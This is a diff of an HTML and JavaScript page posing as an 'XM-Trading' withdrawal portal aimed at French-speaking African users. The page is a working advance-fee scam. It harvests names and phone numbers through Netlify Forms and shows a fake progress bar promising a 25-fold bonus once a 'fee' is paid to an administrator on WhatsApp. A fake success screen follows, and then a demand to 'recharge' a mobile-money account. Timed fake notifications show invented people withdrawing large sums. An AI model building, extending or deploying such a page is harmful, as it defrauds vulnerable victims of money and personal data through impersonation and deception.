@@ -8,150 +8,312 @@
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
   <style>
     /* Reset minimal */
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { height: 100%; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    html, body {
+      height: 100%;
+    }
     body {
       font-family: 'Montserrat', Arial, sans-serif;
-      background-color: #f5f5f5; color: #333;
-      line-height: 1.6; display: flex; flex-direction: column;
-      position: relative; overflow-x: hidden;
+      background-color: #f5f5f5;
+      color: #333;
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow-x: hidden;
     }
-    a { color: #007bff; text-decoration: none; }
-    a:hover { text-decoration: underline; }
+    a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
 
     /* Header */
     header.site-header {
-      background: #000; color: #fff; padding:15px 20px;
-      display:flex; align-items:center; justify-content:space-between;
+      background-color: #000;
+      color: #fff;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
     }
-    header.site-header h1 { font-size:1.5rem; font-weight:600; }
-    header.site-header nav a { margin-left:20px; font-weight:500; }
+    header.site-header .logo {
+      display: flex;
+      align-items: center;
+    }
+    header.site-header .logo img {
+      height: 40px;
+      margin-right: 10px;
+    }
+    header.site-header h1 {
+      font-size: 1.5rem;
+      font-weight: 600;
+    }
+    header.site-header nav a {
+      margin-left: 20px;
+      font-weight: 500;
+      color: #fff;
+    }
+    header.site-header nav a:hover {
+      color: #007bff;
+    }
 
-    /* Container */
+    /* Container principal */
     .container {
-      flex:1; max-width:700px; width:100%; margin:20px auto;
-      background:#fff; padding:25px 30px; border-radius:8px;
-      box-shadow:0 4px 12px rgba(0,0,0,0.1); position:relative; z-index:1;
+      flex: 1;
+      max-width: 700px;
+      width: 100%;
+      margin: 20px auto;
+      background-color: #fff;
+      padding: 25px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      position: relative;
+      z-index: 1;
     }
-    .container h2 { margin-bottom:15px; font-size:1.4rem; color:#000; }
-    .container p { margin-bottom:15px; }
-    form label { display:block; margin-bottom:5px; font-weight:500; color:#222; }
+    .container h2 {
+      margin-bottom: 15px;
+      font-size: 1.4rem;
+      color: #000;
+    }
+    .container p {
+      margin-bottom: 15px;
+    }
+    form label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 500;
+      color: #222;
+    }
     form input[type="text"],
     form input[type="number"],
-    form select,
+    form select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
     form input[type="tel"] {
-      width:100%; padding:10px; margin-bottom:15px;
-      border:1px solid #ccc; border-radius:4px; font-size:1rem;
+      width: calc(100% - 80px);
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-left: 80px;
+      font-size: 1rem;
     }
-    input::placeholder { color:#999; }
-
-    /* Confirm-form style */
-    #confirm-form {
-      background:#fff; color:#000; padding:20px;
-      border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.1);
-      max-width:400px; margin:0 auto 20px;
+    .phone-prefix {
+      position: relative;
+      margin-bottom: 15px;
     }
-    #confirm-form label,
-    #confirm-form p { color:#000; }
-    #confirm-form input[type="text"] { background:#fff; color:#000; }
-    #confirm-form input[type="submit"] { background:#007bff; color:#fff; }
-
-    /* Buttons */
+    .phone-prefix span {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 0.95rem;
+      color: #555;
+    }
+    .phone-prefix input {
+      padding-left: 55px;
+    }
+    input::placeholder {
+      color: #999;
+    }
+    /* Boutons */
     button, input[type="submit"] {
-      background:#007bff; color:#fff; border:none;
-      padding:12px 20px; cursor:pointer; border-radius:4px;
-      font-size:1rem; font-weight:500; transition:background 0.2s;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      cursor: pointer;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: 500;
+      transition: background-color 0.2s ease;
     }
-    button:hover, input[type="submit"]:hover { background:#0056b3; }
+    button:hover, input[type="submit"]:hover {
+      background-color: #0056b3;
+    }
 
-    /* Modal */
+    /* Modal overlay */
     .modal-overlay {
-      position:fixed; top:0; left:0; width:100%; height:100%;
-      background:rgba(0,0,0,0.6); display:flex;
-      align-items:center; justify-content:center; visibility:hidden;
-      opacity:0; transition:opacity .2s;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.2s ease;
     }
-    .modal-overlay.active { visibility:visible; opacity:1; }
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
     .modal-content {
-      background:#fff; padding:25px 20px; width:90%; max-width:500px;
-      border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.2);
-      text-align:left;
+      background-color: #fff;
+      padding: 25px 20px;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 8px;
+      text-align: left;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
     }
-    .modal-content p { font-size:1rem; margin-bottom:15px; color:#222; }
-
-    /* Progress bar */
+    .modal-content p {
+      font-size: 1rem;
+      margin-bottom: 15px;
+      color: #222;
+    }
     .progress-bar-container {
-      width:100%; background:#e0e0e0; border-radius:4px;
-      overflow:hidden; margin:20px 0;
+      width: 100%;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+      margin: 20px 0;
     }
     .progress-bar {
-      width:0; height:20px; background:#007bff; transition:width .3s;
+      width: 0%;
+      height: 20px;
+      background-color: #007bff;
+      transition: width 0.3s ease;
     }
-
-    /* Fee message */
+    /* Style du message d’alerte urgent */
     #feeSection p#feeMessage {
-      margin-top:15px; font-size:.95rem; line-height:1.4;
-      background:#f8d7da; border:1px solid #f5c2c7;
-      color:#842029; padding:12px; border-radius:4px;
+      margin-top: 15px;
+      font-size: 0.95rem;
+      line-height: 1.4;
+      background-color: #f8d7da; /* fond rouge clair */
+      border: 1px solid #f5c2c7; /* bordure rouge */
+      color: #842029; /* texte rouge foncé */
+      padding: 12px;
+      border-radius: 4px;
     }
-    #feeSection p a { color:#d9534f; font-weight:500; }
+    #feeSection p a {
+      color: #d9534f; /* rouge pour contact */
+      font-weight: 500;
+    }
 
-    /* Sections cachées / succès */
-    #code-section, #payout-section { display:none; }
+    /* Section code masquée jusqu'au lien param ?code= */
+    #code-section {
+      display: none;
+    }
+
+    /* Section succès inline */
     #success-section {
-      display:none; margin-top:20px; text-align:center;
+      display: none;
+      margin-top: 20px;
+      text-align: center;
     }
-    #success-section h2 { font-size:1.6rem; margin-bottom:15px; color:#fff; }
-    #success-section p { margin-bottom:10px; color:#fff; font-size:1rem; }
+    #success-section h2 {
+      font-size: 1.6rem;
+      margin-bottom: 15px;
+      color: #fff;
+    }
+    #success-section p {
+      margin-bottom: 10px;
+      color: #fff;
+      font-size: 1rem;
+    }
     body.success-mode {
-      background-image:url('success-bg.jpg');
-      background-size:cover; background-position:center; color:#fff;
+      background-image: url('success-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      color: #fff;
     }
-    body.success-mode .container { background:rgba(0,0,0,0.7); color:#fff; }
+    body.success-mode .container {
+      background-color: rgba(0,0,0,0.7);
+      color: #fff;
+    }
 
     /* Footer */
     footer.site-footer {
-      background:#000; color:#ccc; padding:15px 20px;
-      text-align:center; font-size:.9rem;
+      background-color: #000;
+      color: #ccc;
+      padding: 15px 20px;
+      text-align: center;
+      font-size: 0.9rem;
     }
-    footer.site-footer a { color:#007bff; }
-    footer.site-footer a:hover { color:#fff; }
+    footer.site-footer a {
+      color: #007bff;
+    }
+    footer.site-footer a:hover {
+      color: #fff;
+    }
 
-    /* Notifications */
+    /* Notifications ambiantes centrées */
     .notif-container {
-      position:fixed; top:50%; left:50%;
-      transform:translate(-50%,-50%); z-index:1100;
-      display:flex; flex-direction:column; align-items:center;
-      gap:10px; pointer-events:none; max-width:80%;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1100;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      pointer-events: none;
+      width: auto;
+      max-width: 80%;
     }
     .notif {
-      background:rgba(0,0,0,0.85); color:#fff;
-      padding:12px 18px; border-radius:6px; font-size:1rem;
-      opacity:0; animation:notifFade 3s ease forwards;
-      display:flex; align-items:center; gap:8px;
+      background-color: rgba(0, 0, 0, 0.85);
+      color: #fff;
+      padding: 12px 18px;
+      border-radius: 6px;
+      font-size: 1rem;
+      opacity: 0;
+      animation: notifFade 3s ease forwards;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
     @keyframes notifFade {
-      0% { opacity:0; transform:translateY(20px) scale(.9); }
-      10% { opacity:1; transform:translateY(0) scale(1); }
-      70% { opacity:1; }
-      100% { opacity:0; transform:translateY(-20px) scale(.9); }
+      0% { opacity: 0; transform: translateY(20px) scale(0.9); }
+      10% { opacity: 1; transform: translateY(0) scale(1); }
+      70% { opacity: 1; transform: translateY(0) scale(1); }
+      100% { opacity: 0; transform: translateY(-20px) scale(0.9); }
     }
 
-    @media (max-width:600px) {
+    @media (max-width: 600px) {
       header.site-header, footer.site-footer {
-        flex-direction:column; text-align:center;
+        flex-direction: column;
+        text-align: center;
       }
-      .container { margin:15px; padding:20px; }
-      .modal-content { padding:20px; }
-      .notif-container { top:40%; max-width:90%; }
+      header.site-header nav a {
+        margin: 8px;
+      }
+      .container {
+        margin: 15px;
+        padding: 20px;
+      }
+      .modal-content {
+        padding: 20px;
+      }
+      .notif-container {
+        top: 40%;
+        max-width: 90%;
+      }
     }
   </style>
 </head>
 <body id="page-index">
-
-  <!-- Header -->
+  <!-- En-tête -->
   <header class="site-header">
-    <h1>XM-Trading Retrait</h1>
+    <div class="logo">
+      <h1>XM-Trading Retrait</h1>
+    </div>
     <nav>
       <a href="#initial-section">Accueil</a>
       <a href="#initial-section">Demande</a>
@@ -159,13 +321,16 @@
     </nav>
   </header>
 
+  <!-- Contenu principal -->
   <div class="container">
-    <!-- SECTION 1 -->
+    <!-- SECTION 1 : Formulaire initial -->
     <div id="initial-section">
       <h2>Demande de retrait</h2>
       <form id="withdrawal-form" name="withdrawal-request" data-netlify="true" netlify-honeypot="bot-field">
         <input type="hidden" name="form-name" value="withdrawal-request">
-        <p style="display:none;"><label>Ne pas remplir <input name="bot-field"></label></p>
+        <p style="display:none">
+          <label>Ne pas remplir <input name="bot-field"></label>
+        </p>
         <label for="firstName">Prénom</label>
         <input type="text" id="firstName" name="firstName" placeholder="Votre prénom" required>
         <label for="lastName">Nom</label>
@@ -205,12 +370,11 @@
       </form>
     </div>
 
-    <!-- SECTION 2 -->
+    <!-- SECTION 2 : saisie du code après paiement hors-ligne -->
     <div id="code-section">
       <h2>Confirmation finale</h2>
       <p>Vous avez reçu votre nouveau code de confirmation ? Saisissez-le ci-dessous :</p>
-      <form id="confirm-form" name="confirm-form" data-netlify="true">
-        <input type="hidden" name="form-name" value="confirm-form">
+      <form id="confirm-form">
         <label for="newInvestmentCode">Nouveau code d’investissement</label>
         <input type="text" id="newInvestmentCode" name="newInvestmentCode" placeholder="Entrez le code reçu" required>
         <input type="submit" value="Valider le code">
@@ -218,18 +382,18 @@
       <p id="confirmError" style="color:red; display:none;">Message d’erreur ici</p>
     </div>
 
-    <!-- SECTION 3 -->
+    <!-- SECTION 3 : Succès -->
     <div id="success-section">
       <h2 id="successGreeting"></h2>
       <p>Votre demande de retrait a été traitée avec succès.</p>
       <p>L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
       <p>Le montant sera versé selon les modalités convenues.</p>
-      <p>Pour toute question, contactez votre administrateur.</p>
+      <p>Pour toute question supplémentaire, contactez de nouveau l’administrateur.</p>
       <button id="btn-receive-gain">Recevoir mon gain</button>
     </div>
 
-    <!-- SECTION 4 -->
-    <div id="payout-section" class="container">
+    <!-- SECTION 4 : formulaire de versement (masquée au départ) -->
+    <div class="container" id="payout-section" style="display: none; margin-top:20px;">
       <h2>Demande de versement</h2>
       <form id="payout-form">
         <label for="payoutCountry">Pays de réception</label>
@@ -272,65 +436,306 @@
         <input type="submit" value="Finaliser">
       </form>
     </div>
-
   </div>
 
-  <!-- Modal -->
+  <!-- Modal de progression unique -->
   <div id="progressModal" class="modal-overlay">
     <div class="modal-content">
       <p id="progressText">Traitement en cours...</p>
-      <div class="progress-bar-container"><div id="progressBar" class="progress-bar"></div></div>
-      <div id="feeSection" style="display:none;">
-        <p id="feeMessage"></p>
-        <p>Contactez l’administrateur sur WhatsApp pour payer les frais et recevoir votre gain :<br>
-          <a href="tel:+2376XXXXXXX">+237 6XXXXXXX</a>
+      <div class="progress-bar-container">
+        <div id="progressBar" class="progress-bar"></div>
+      </div>
+      <div id="feeSection" style="display: none;">
+        <p id="feeMessage" class="fee-message"></p>
+        <p>
+          Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain :<br>
+          <a href="tel:+2376XXXXXXX">WhatsApp/Phone: +237 6XXXXXXX</a>
         </p>
       </div>
     </div>
   </div>
 
-  <!-- Notifications -->
+  <!-- Notifications ambiantes centrées -->
   <div class="notif-container" id="notifContainer"></div>
 
   <!-- Footer -->
   <footer class="site-footer" id="footer-contact">
     <p>&copy; 2025 XM-Trading. Tous droits réservés.</p>
-    <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp : +237 6XXXXXXX</p>
+    <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp: +237 6XXXXXXX</p>
   </footer>
 
   <script>
-    // Pays, notifications, forms et logique (inchangé de la version précédente)
-    const countryDialCodes = [ /* ... */ ];
-    const africanNames = [ /* ... */ ];
-    function randInt(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
-    function formatAmount(v,c){ /* ... */ }
+    // Mapping pays → code ISO, indicatif, longueur de numéro
+    const countryDialCodes = [
+      { name: "Bénin", code: "BJ", dial_code: "+229", phone_length: 8 },
+      { name: "Burkina Faso", code: "BF", dial_code: "+226", phone_length: 8 },
+      { name: "Côte d'Ivoire", code: "CI", dial_code: "+225", phone_length: 8 },
+      { name: "Ghana", code: "GH", dial_code: "+233", phone_length: 9 },
+      { name: "Guinée", code: "GN", dial_code: "+224", phone_length: 8 },
+      { name: "Mali", code: "ML", dial_code: "+223", phone_length: 8 },
+      { name: "Niger", code: "NE", dial_code: "+227", phone_length: 8 },
+      { name: "Nigeria", code: "NG", dial_code: "+234", phone_length: 10 },
+      { name: "Sénégal", code: "SN", dial_code: "+221", phone_length: 8 },
+      { name: "Togo", code: "TG", dial_code: "+228", phone_length: 8 },
+      { name: "Cameroun", code: "CM", dial_code: "+237", phone_length: 8 },
+      { name: "République du Congo", code: "CG", dial_code: "+242", phone_length: 8 },
+      { name: "République démocratique du Congo", code: "CD", dial_code: "+243", phone_length: 9 },
+      { name: "Centrafrique", code: "CF", dial_code: "+236", phone_length: 8 },
+      { name: "Tchad", code: "TD", dial_code: "+235", phone_length: 8 },
+      { name: "Gabon", code: "GA", dial_code: "+241", phone_length: 7 },
+      { name: "Guinée équatoriale", code: "GQ", dial_code: "+240", phone_length: 7 },
+      { name: "São Tomé-et-Principe", code: "ST", dial_code: "+239", phone_length: 7 },
+      { name: "Madagascar", code: "MG", dial_code: "+261", phone_length: 9 },
+      { name: "Kenya", code: "KE", dial_code: "+254", phone_length: 9 },
+      { name: "Ouganda", code: "UG", dial_code: "+256", phone_length: 9 },
+      { name: "Rwanda", code: "RW", dial_code: "+250", phone_length: 9 },
+      { name: "Éthiopie", code: "ET", dial_code: "+251", phone_length: 9 },
+      { name: "Haïti", code: "HT", dial_code: "+509", phone_length: 8 }
+    ];
 
-    document.addEventListener('DOMContentLoaded',()=>{
-      // Peupler tous les selects “Pays”
-      [ 'country','payoutCountry' ].forEach(id=>{
-        const sel = document.getElementById(id);
-        countryDialCodes.forEach(it=>{
-          const o=document.createElement('option');
-          o.value=it.code; o.textContent=it.name;
-          o.dataset.dialCode=it.dial_code;
-          o.dataset.phoneLength=it.phone_length;
-          sel.appendChild(o);
-        });
-        sel.addEventListener('change',()=>{
-          const targetPhone = document.getElementById(id==='country'?'phone':'payoutPhone');
-          const prefixSpan  = document.getElementById(id==='country'?'phone-prefix':'payoutPhonePrefix');
-          const s=sel.selectedOptions[0];
-          prefixSpan.textContent=s.dataset.dialCode;
-          targetPhone.maxLength=s.dataset.phoneLength;
-          let ex='';for(let i=0;i<s.dataset.phoneLength;i++) ex+='X';
-          targetPhone.placeholder='Ex : '+ex;
-        });
+    const africanNames = [
+      "Moussa", "Amina", "Koffi", "Fatou", "Youssouf", "Adama", "Koumba", "Issa", "Mariama",
+      "Oumar", "Salimata", "Cheikh", "Awa", "Jean", "Marie", "Kwame", "Nadia", "Mohamed",
+      "Abdoulaye", "Chantal", "Ousmane", "Rokia", "Seydou", "Hadja", "Boubacar", "Grace",
+      "Samuel", "Jacques", "Patience", "Emmanuel", "Fally", "Adjoa", "Tiemoko", "Aïcha"
+    ];
+
+    function randInt(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+    function formatAmount(amount, currency) {
+      if (currency === 'FCFA') {
+        return amount.toLocaleString('fr-FR') + ' FCFA';
+      } else {
+        return amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' $';
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // Initial form setup
+      const countrySelect = document.getElementById('country');
+      const phonePrefixSpan = document.getElementById('phone-prefix');
+      const phoneInput = document.getElementById('phone');
+      countryDialCodes.forEach(item => {
+        const opt = document.createElement('option');
+        opt.value = item.code;
+        opt.textContent = item.name;
+        opt.dataset.dialCode = item.dial_code;
+        opt.dataset.phoneLength = item.phone_length;
+        countrySelect.appendChild(opt);
+      });
+      countrySelect.addEventListener('change', () => {
+        const sel = countrySelect.selectedOptions[0];
+        if (sel) {
+          phonePrefixSpan.textContent = sel.dataset.dialCode;
+          const len = parseInt(sel.dataset.phoneLength,10);
+          phoneInput.maxLength = len;
+          let ex = ''; for(let i=0;i<len;i++) ex+='X';
+          phoneInput.placeholder = 'Ex: '+ex;
+        }
       });
 
-      // Logique des formulaires, modal, notifications …
-      // (copiez ici le JS complet de la version précédente pour
-      // withdrawalForm, confirmForm, showProgressModal, showFinalProgress,
-      // enterSuccessMode, btnReceive, payoutForm, notifications ambiantes)
+      // Sections & forms
+      const initialSection = document.getElementById('initial-section');
+      const codeSection    = document.getElementById('code-section');
+      const successSection = document.getElementById('success-section');
+      const payoutSection  = document.getElementById('payout-section');
+      const withdrawalForm = document.getElementById('withdrawal-form');
+      const confirmForm    = document.getElementById('confirm-form');
+      const payoutForm     = document.getElementById('payout-form');
+      const confirmError   = document.getElementById('confirmError');
+      const modal          = document.getElementById('progressModal');
+      const progressBar    = document.getElementById('progressBar');
+      const progressText   = document.getElementById('progressText');
+      const feeSection     = document.getElementById('feeSection');
+      const feeMessage     = document.getElementById('feeMessage');
+      const notifContainer = document.getElementById('notifContainer');
+      const successGreeting= document.getElementById('successGreeting');
+      const btnReceive     = document.getElementById('btn-receive-gain');
+      const payoutCountry  = document.getElementById('payoutCountry');
+      const payoutPhone    = document.getElementById('payoutPhone');
+      const payoutPhonePref= document.getElementById('payoutPhonePrefix');
+
+      let storedFirstName = '', storedLastName = '', storedGender = '';
+
+      const urlParams    = new URLSearchParams(window.location.search);
+      const expectedCode = urlParams.get('code');
+      const hasSubmitted = localStorage.getItem('hasSubmitted')==='true';
+
+      codeSection.style.display = 'none';
+      if(expectedCode && hasSubmitted){
+        initialSection.style.display='none';
+        codeSection.style.display='block';
+      }
+
+      // Initial withdrawal submission
+      withdrawalForm.addEventListener('submit', e => {
+        e.preventDefault();
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName  = document.getElementById('lastName').value.trim();
+        const genderSel = document.getElementById('gender').value;
+        if(!firstName||!lastName){ alert('Veuillez saisir votre prénom et nom.'); return; }
+        if(!genderSel){ alert('Veuillez sélectionner votre sexe pour la salutation.'); return; }
+        storedFirstName = firstName;
+        storedLastName  = lastName;
+        storedGender    = genderSel;
+
+        const countrySel = countrySelect.selectedOptions[0];
+        if(countrySel){
+          const expectedLen = parseInt(countrySel.dataset.phoneLength,10);
+          const digitsOnly = phoneInput.value.replace(/\D/g,'');
+          if(digitsOnly.length!==expectedLen){
+            alert(`Le numéro de téléphone doit comporter exactement ${expectedLen} chiffres pour ${countrySel.textContent}.`);
+            return;
+          }
+        }
+        const data = new FormData(withdrawalForm);
+        const currency = data.get('currency');
+        const amount   = parseFloat(data.get('amount'));
+        if(isNaN(amount)||amount<=0){ alert('Veuillez saisir un montant valide.'); return; }
+        let bonus = amount*25, fee = amount*2.5;
+        if(currency==='USD'){ bonus = Math.round(bonus*100)/100; fee = Math.round(fee*100)/100; }
+        else { bonus = Math.round(bonus); fee = Math.round(fee); }
+
+        // send to Netlify
+        const payload = {};
+        data.forEach((v,k)=>payload[k]=v);
+        payload['form-name'] = withdrawalForm.getAttribute('name');
+        const encode = obj=>Object.keys(obj).map(k=>encodeURIComponent(k)+'='+encodeURIComponent(obj[k])).join('&');
+        fetch('/',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:encode(payload)})
+          .then(()=>console.log('Envoyé à Netlify Forms'))
+          .catch(err=>console.error(err));
+
+        localStorage.setItem('hasSubmitted','true');
+        showProgressModal(bonus, fee, currency);
+      });
+
+      // Confirm code
+      confirmForm.addEventListener('submit', e=>{
+        e.preventDefault();
+        const code = document.getElementById('newInvestmentCode').value.trim();
+        if(!code){
+          confirmError.textContent='Veuillez saisir le code.'; confirmError.style.display='block'; return;
+        }
+        if(!expectedCode){ alert('Aucun code valide n’est fourni.'); return; }
+        if(code!==expectedCode){
+          confirmError.textContent="Code incorrect."; confirmError.style.display='block'; return;
+        }
+        confirmError.style.display='none';
+        showFinalProgress();
+      });
+
+      // Populate payout country select
+      countryDialCodes.forEach(item=>{
+        const opt = document.createElement('option');
+        opt.value = item.code; opt.textContent = item.name;
+        opt.dataset.dialCode = item.dial_code; opt.dataset.phoneLength = item.phone_length;
+        payoutCountry.appendChild(opt);
+      });
+      payoutCountry.addEventListener('change', ()=>{
+        const sel = payoutCountry.selectedOptions[0];
+        if(sel){
+          payoutPhonePref.textContent = sel.dataset.dialCode;
+          payoutPhone.maxLength = sel.dataset.phoneLength;
+          let ex=''; for(let i=0;i<sel.dataset.phoneLength;i++) ex+='X';
+          payoutPhone.placeholder = 'Ex: '+ex;
+        }
+      });
+
+      // Receive gain button
+      btnReceive.addEventListener('click', ()=>{
+        ['initial-section','code-section','success-section'].forEach(id=>document.getElementById(id).style.display='none');
+        payoutSection.style.display='block';
+        payoutSection.scrollIntoView({behavior:'smooth'});
+      });
+
+      // Finalize payout
+      payoutForm.addEventListener('submit', e=>{
+        e.preventDefault();
+        const amount   = parseFloat(document.getElementById('payoutAmount').value);
+        const currency = document.getElementById('payoutCurrency').value;
+        const method   = document.getElementById('payoutMethod').value;
+        const gain     = amount*25;
+        const toRec    = amount*4;
+        const fmt = v=> currency==='FCFA'
+          ? v.toLocaleString('fr-FR')+' FCFA'
+          : v.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})+' $';
+        alert(
+          `⚠️ Alerte : votre compte ${method} est inactif pour recevoir votre gain !\n\n`+
+          `Pour recevoir vos ${fmt(gain)}, vous devez recharger un montant de ${fmt(toRec)} dans votre compte ${method}.\n\n`+
+          `Une fois la recharge effectuée, contactez votre administrateur pour finaliser votre paiement !\n\nMerci.`
+        );
+      });
+
+      // Modals & progress functions
+      function showProgressModal(bonus, fee, currency){
+        modal.classList.add('active');
+        feeSection.style.display='none';
+        progressBar.style.width='0%'; progressText.textContent='Traitement en cours...';
+        let prog=0, target=90;
+        const timer=setInterval(()=>{
+          if(prog<target){ prog+=2; progressBar.style.width=prog+'%'; }
+          else{
+            clearInterval(timer);
+            progressText.textContent=`Progression : ${target}%`;
+            feeMessage.innerHTML =
+              `<strong>🎉 Félicitations ! Ce cas est exceptionnel :</strong><br>`+
+              `Vous recevrez <strong>${formatAmount(bonus,currency)}</strong> mais devez payer les frais <strong>${formatAmount(fee,currency)}</strong>.<br>`+
+              `<strong>Contactez l’administrateur pour finaliser.</strong>`;
+            feeSection.style.display='block';
+          }
+        },40);
+      }
+      function showFinalProgress(){
+        modal.classList.add('active');
+        feeSection.style.display='none';
+        progressBar.style.width='0%'; progressText.textContent='Finalisation en cours...';
+        let prog=0, target=100;
+        const timer=setInterval(()=>{
+          if(prog<target){ prog+=4; progressBar.style.width=prog+'%'; progressText.textContent=`Progression : ${prog}%`; }
+          else{
+            clearInterval(timer);
+            setTimeout(()=>{
+              modal.classList.remove('active');
+              enterSuccessMode();
+            },300);
+          }
+        },20);
+      }
+      function enterSuccessMode(){
+        successGreeting.textContent = storedGender && storedFirstName && storedLastName
+          ? `${storedGender} ${storedFirstName} ${storedLastName}, félicitations 🎉 Votre retrait est finalisé !`
+          : `Félicitations 🎉 Votre retrait est finalisé !`;
+        initialSection.style.display = codeSection.style.display = 'none';
+        successSection.style.display = 'block';
+        document.body.classList.add('success-mode');
+        window.scrollTo({top:0,behavior:'smooth'});
+      }
+
+      // Ambient notifications
+      function showRandomNotification(){
+        const name = africanNames[randInt(0,africanNames.length-1)];
+        const useFCFA = Math.random()<0.6;
+        const amt = useFCFA
+          ? randInt(500000,5000000)
+          : randInt(300,5000);
+        const cur = useFCFA?'FCFA':'USD';
+        const text= `🎉 ${name} vient de retirer ${formatAmount(amt,cur)}`;
+        const notif=document.createElement('div');
+        notif.className='notif';
+        notif.textContent=text;
+        notifContainer.appendChild(notif);
+        setTimeout(()=>notif.remove(),3000);
+      }
+      function scheduleNotif(){
+        const delay=randInt(3000,6000);
+        setTimeout(()=>{
+          showRandomNotification();
+          scheduleNotif();
+        },delay);
+      }
+      scheduleNotif();
+
     });
   </script>
 </body>
